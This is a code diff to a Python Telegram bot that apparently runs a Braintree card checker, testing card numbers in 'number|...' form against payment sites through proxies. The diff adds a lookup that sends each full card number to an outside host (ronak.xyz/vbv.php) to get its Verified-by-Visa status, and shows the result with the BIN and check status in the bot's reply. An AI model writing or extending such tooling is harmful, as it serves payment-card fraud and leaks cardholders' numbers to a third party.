@@ -2,12 +2,14 @@ import os
 import asyncio
 import logging
 import time
+import html
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes, ConversationHandler, MessageHandler, filters
 from main import BraintreeAutomatedChecker
 import json
 import re
 import requests
+import httpx
 
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -67,7 +69,18 @@ def get_bin_info(bin_number):
         "bank": "UNKNOWN"
     }
 
-def format_card_result(card_data, result, time_taken, proxy_used, requester_username):
+async def get_vbv_info(card_number: str) -> str:
+    """Fetch VBV (Verified by Visa) information for a card"""
+    try:
+        async with httpx.AsyncClient(timeout=10.0) as client:
+            response = await client.get(f"https://ronak.xyz/vbv.php?cc={card_number}")
+            if response.status_code == 200:
+                return response.text.strip()
+    except Exception as e:
+        logger.error(f"Error fetching VBV info: {e}")
+    return "Unknown"
+
+def format_card_result(card_data, result, time_taken, proxy_used, requester_username, vbv_info="Unknown"):
     """Format card check result with fancy template"""
     parts = card_data.split('|')
     card_number = parts[0]
@@ -85,6 +98,7 @@ def format_card_result(card_data, result, time_taken, proxy_used, requester_user
 𝐂𝐂 ➜ `{masked_card}`
 𝐒𝐓𝐀𝐓𝐔𝐒 ➜ {status_emoji}
 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {result}
+𝑽𝑩𝑽 ➜ {vbv_info}
 ━━━━━━━━━
 𝐁𝐈𝐍 ➜ {bin_number}
 𝐓𝐘𝐏𝐄 ➜ {bin_info.get('brand', 'N/A')} {bin_info.get('type', 'N/A')}
@@ -180,6 +194,9 @@ async def br_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         result = await asyncio.to_thread(checker.check_card, site_url, card_data)
         
+        card_number = card_data.split('|')[0]
+        vbv_info = await get_vbv_info(card_number)
+        
         time_taken = time.time() - start_time
         
         requester_username = update.effective_user.username or update.effective_user.first_name or "Unknown"
@@ -189,7 +206,8 @@ async def br_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             result,
             time_taken,
             proxy_used,
-            requester_username
+            requester_username,
+            vbv_info
         )
         
         await status_msg.edit_text(formatted_result, parse_mode='Markdown')
@@ -264,6 +282,10 @@ async def mbr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 }
             
             result = await asyncio.to_thread(checker.check_card, site_url, card_data)
+            
+            card_number = card_data.split('|')[0]
+            vbv_info = await get_vbv_info(card_number)
+            
             time_taken = time.time() - start_time
             
             formatted_result = format_card_result(
@@ -271,7 +293,8 @@ async def mbr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 result,
                 time_taken,
                 proxy_used,
-                requester_username
+                requester_username,
+                vbv_info
             )
             
             all_results.append(formatted_result)
